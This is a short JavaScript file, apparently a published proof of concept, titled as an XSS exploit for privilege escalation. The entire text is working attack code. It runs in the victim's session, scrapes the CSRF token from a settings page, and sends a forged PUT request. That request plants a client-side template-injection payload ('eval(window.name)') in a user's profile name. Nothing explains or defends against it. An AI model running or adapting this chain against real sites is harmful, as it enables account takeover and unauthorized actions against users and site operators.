// XSS Exploit code for Privilege Escalation
// Author: R0K

var woot = document.createElement('html');
fetch('https://vulnerablesite.com/settings',{credentials: 'include'}).then((resp) => resp.text()).then(function(data){

woot.innerHTML=data;
var csrf_token = woot.getElementsByTagName('meta')[3]['content'];
privilege_escalate();

function privilege_escalate(){
var req = new XMLHttpRequest();
req.open('POST','https://vulnerablesite.com/users/mrs-camylle-kertzmazevalwindowname',true);
req.withCredentials = true;
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
req.send('_method=PUT&_token='+csrf_token+'&name=Mrs.+Camylle+Kertzmaz%7B%7Beval%28window.name%29%7D%7D&email=user%40example.org&phone=&csc=1');
}
